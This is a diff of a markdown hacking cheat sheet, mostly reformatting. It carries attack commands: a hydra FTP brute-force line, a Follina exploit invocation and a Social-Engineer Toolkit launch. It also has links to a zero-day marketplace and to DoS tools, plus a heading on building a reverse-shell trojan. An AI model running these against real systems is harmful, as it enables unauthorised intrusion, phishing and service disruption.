@@ -2,16 +2,17 @@
 https://attack.mitre.org/
 
 ## Exploitation is someone brute-forcing it with hydra
+```sh
 hydra -L users.txt -P pass.txt IP_ADDRESS ftp -V
-
-# Intrusion Prevention System (IPS) is security system for catching and preventing security threats.
- ▪ It works on predefined security rules, just like IP
+```
+## **Intrusion Prevention System (IPS)** is security system for catching and preventing security threats.
+ ▪ It works on predefined security rules, just like IP:
 
 https://www.snort.org/
 
 ## How to Check What Ports are Opened on Your PC?
-▪ Windows: netstat –an, netstat –antb <br />
-▪ Unix: ss -nltp, netstat –tulpn <br />
+▪ **Windows:** netstat –an, netstat –antb <br />
+▪ **Unix:** ss -nltp, netstat –tulpn <br />
 
 # JWT Token Vulnerability
 ```sh
@@ -49,10 +50,10 @@ msf6 exploit(multi/http/drupal_drupageddon) > exploit
 https://github.com/SpiderLabs/Responder <br />
 
 
-# Zero Days Marketplace (There is a database and a marketplace for that) <br />
+## Zero Days Marketplace (There is a database and a marketplace for that) <br />
 https://0day.today
 
-# Using Folina 
+## Using Folina 
 ```sh
 python3 follina.py -r 9999
 ```
@@ -85,29 +86,14 @@ Technical Side of Phishing Attacks is Scary Easy to Replicate <br />
 sudo setoolkit
 ```
 
-Select from the menu:
-1) Social-engineering Attacks   <br />
-2) Penetration Testing (Fast-Track)   <br />
-3) Third Party Modules   <br />
-4) Update the Social-Engineer Toolkit   <br />
-
-PRESS: set> 1
-
-Select from the menu:
-1) Spear-Phishing Attack Vectors   <br />
-2) Website Attack Vectors   <br />
-3) Infectious Media Generator   <br />
-
-set> 2
-
 ## Denial of Service (DOS)is the easiest to perform attack
 
-LOIC (https://sourceforge.net/projects/loic/)–TCP, UDP, HTTP    <br />
+▪ **LOIC** (https://sourceforge.net/projects/loic/)–TCP, UDP, HTTP    <br />
 GET FLOODS   <br /> 
- ▪HOIC (https://sourceforge.net/projects/highorbitioncannon/)   <br />
+▪ **HOIC** (https://sourceforge.net/projects/highorbitioncannon/)   <br />
  HTTP GET / POST requests   <br />
- ▪hping3: https://www.kali.org/tools/hping3/   <br />
- ▪TorsHammer: https://github.com/Karlheinzniebuhr/torshammer   <br />
+▪ **hping3:** https://www.kali.org/tools/hping3/   <br />
+▪ **TorsHammer:** https://github.com/Karlheinzniebuhr/torshammer   <br />
 
 
 ## How to Generate Simple (and Detectable of Course) Trojan for Reverse Shell Callback?
